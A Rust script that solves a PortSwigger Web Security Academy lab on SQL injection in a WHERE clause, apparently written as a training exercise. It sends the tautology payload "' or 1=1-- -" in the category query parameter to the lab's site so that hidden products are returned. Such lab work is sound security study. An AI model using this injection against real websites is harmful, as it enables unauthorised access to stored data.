/*************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 12/9/2023
*
* PortSwigger LAB: SQL injection vulnerability in WHERE clause allowing
*                  retrieval of hidden data
*
* Steps: 1. Inject payload in the "category" query parameter
*        2. Retrieve all products without filtering
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a7d001a03ca64ed8499a508001b00e6.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    println!("{} {}", "1. Injecting payload..".white(), "OK".green());
    // the payload to inject in the query parameter
    let payload = "' or 1=1-- -";
    // fetch the page with the injected payload
    let inject = client
        .get(format!("{url}/filter?category=Accessories{payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));
    println!(
        "{} {}",
        "2. Retrieving all products without filtering..".white(),
        "OK".green()
    );
    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
